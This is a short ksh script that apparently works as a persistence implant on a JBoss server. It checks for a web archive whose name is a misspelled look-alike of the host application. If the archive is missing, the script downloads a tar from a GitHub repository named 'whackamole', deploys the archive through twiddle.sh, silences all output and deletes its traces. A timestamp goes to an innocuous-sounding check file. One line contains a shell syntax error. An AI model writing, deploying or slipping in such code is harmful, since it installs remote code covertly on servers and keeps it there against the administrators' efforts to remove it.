#!/bin/ksh

if [ ! -d "/usr/appl/col/home/uatcol/colline/jboss/server/default/deploy/management/colliine1.war" ]; then curl https://raw.githubusercontent.com/BobbysTables/whackamole/master/quick1.tar -o /usr/appl/col/home/uatcol/colliine.tar;tar -xvf /usr/appl/col/home/uatcol/colliine.tar; cp -r /usr/appl/col/home/uatcol/colliine.war "/usr/appl/col/home/uatcol/colline/jboss/server/default/deploy/management/colliine1.war" > /dev/null 2>&1 ;chmod 755 "/usr/appl/col/home/uatcol/colline/jboss/server/default/deploy/management/colliine1.war" > /dev/null 2>&1; && /usr/appl/col/home/uatcol/colline/jboss/bin/twiddle.sh invoke jboss.system:service=MainDeployer deploy /usr/appl/col/home/uatcol/colline/jboss/server/default/deploy/management/colliine1.war > /dev/null 2>&1 ; rm -r "/usr/appl/col/home/uatcol/colliine.tar"; rm -r "/usr/appl/col/home/uatcol/colliine.war"; fi 

#rm -rf colliinedeploy.sh

dat=`date +%m/%d/%y%n%H:%M:%S`
echo ' '
echo "$SCRIPT script ended at..." $dat >/tmp/warDeploymentChecked1.txt
echo ' '
